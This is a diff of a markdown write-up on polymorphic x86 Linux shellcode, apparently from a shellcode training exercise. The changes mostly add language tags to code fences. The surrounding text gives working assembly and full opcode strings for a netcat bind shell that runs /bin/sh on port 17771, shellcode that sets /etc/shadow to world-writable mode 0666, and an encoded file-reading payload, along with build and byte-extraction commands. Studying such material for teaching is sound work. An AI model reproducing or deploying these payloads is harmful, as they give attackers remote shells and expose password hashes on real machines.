@@ -69,7 +69,7 @@ Just execute the execve syscall:
 
 Creating a polymorphic shellcode, I have used different methods. To the "-vp17771" I have used the mov instruction on the stack:
 
-```
+```asm
     mov dword [esp - 4], 0x31373737
     mov dword [esp - 8], 0x3170762d 
     sub esp, 8
@@ -78,7 +78,7 @@ Creating a polymorphic shellcode, I have used different methods. To the "-vp1777
 
 To do the "-le//bin//sh" I have used the push instruction but with a polymorphic calculation of the data, doing add and sub instructions:
 
-```
+```asm
     push eax 
     mov eax, 0x68732f2f
     push eax
@@ -91,7 +91,7 @@ To do the "-le//bin//sh" I have used the push instruction but with a polymorphic
 
 To do the "/bin/nc" I continued doing the add instruction to create the correct string (/bin/sh):
 
-```
+```asm
     push edx
     add eax, 0x3408c302
     push eax
@@ -105,7 +105,7 @@ To do the "/bin/nc" I continued doing the add instruction to create the correct 
 
 So, the final shellcode is:
 
-```
+```asm
 global _start
 section .text
  _start:
@@ -159,14 +159,14 @@ section .text
 
 Compile, test and calcule the %:
 
-```
+```bash
 $ nasm -f elf32 netcat.nasm -o netcat.o
 $ ld netcat.o -o netcat
 $ objdump -d ./netcat|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\x89\xc2\x50\xc7\x44\x24\xfc\x37\x37\x37\x31\xc7\x44\x24\xf8\x2d\x76\x70\x31\x83\xec\x08\x89\xe6\x50\xb8\x2f\x2f\x73\x68\x50\x05\x01\x33\xf6\x05\x83\xe8\x01\x50\x2d\x02\xf6\x03\x3f\x50\x89\xe7\x52\x05\x02\xc3\x08\x34\x50\x05\x01\x33\xfb\x0a\x83\xe8\x01\x50\x89\xe3\x89\xd0\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
-```
+```bash
 $ cat netcat-new.c 
 #include <stdio.h>
 #include <string.h>
@@ -364,7 +364,7 @@ $ objdump -d ./read|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|
 "\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xeb\x3e\x5b\xb1\x0b\xf6\x13\x43\xe2\xfb\x83\xeb\x0b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\x88\xd0\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb3\x01\x88\xd8\x04\x03\x88\xda\xcd\x80\x83\xc4\x01\xeb\xdd\xe8\xbd\xff\xff\xff\xd0\x9a\x8b\x9c\xd0\x8f\x9e\x8c\x8c\x88\x9b"
 ```
 
-```c
+```bash
 $ cat read.c
 #include <stdio.h>
 #include <string.h>
@@ -401,21 +401,19 @@ The following shellcode change the permissions of the /etc/shadow file using the
 
 The sys\_chmod syscall is 0xf, so, save in the eax register 0xf
 
-```
+```asm
  	push byte 15
 	pop eax
 ```
-eax = 0xf
 
-
-```
+```c
 int chmod(const char *pathname, mode_t mode);
 ```
 now, we need the pathname in ebx and the mode (666) in ecx.
 
 /etc/shadow in ebx:
 
-```
+```asm
 	push byte 0x77
 	push word 0x6f64
 	push 0x6168732f
@@ -425,14 +423,14 @@ now, we need the pathname in ebx and the mode (666) in ecx.
 
 666 in ecx:
 
-```
+```asm
 	push word 0666Q
 	pop ecx
 ```
 
 After, just exec the syscall (In addition, the exit syscall is executed at the end):
 
-```
+```asm
 	int 0x80
 	push byte 1
 	pop eax
@@ -446,14 +444,15 @@ My polymorphic shellcode works same but it is generating the pathname on the way
 
 Saving the sys\_chmod in eax:
 
-```
+```asm
 	xor edx, edx
 	xor eax, eax
 	add eax, 0xf
 ```
 
 Generating the pathname:
-```
+
+```asm
 	mov ecx, 0x11
 	add ecx, 0x66
 	push ecx
@@ -467,7 +466,7 @@ Generating the pathname:
 
 Set the mode and run the syscall:
 
-```
+```asm
 	xor ecx, ecx
 	mov cx, 0x1b6
 	int 0x80
@@ -478,7 +477,8 @@ Set the mode and run the syscall:
 
 
 Compile and run:
-```
+
+```bash
 $ nasm -f elf32 chmod.nasm -o chmod.o
 $ ld chmod.o -o chmod
 $ objdump -d ./chmod|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
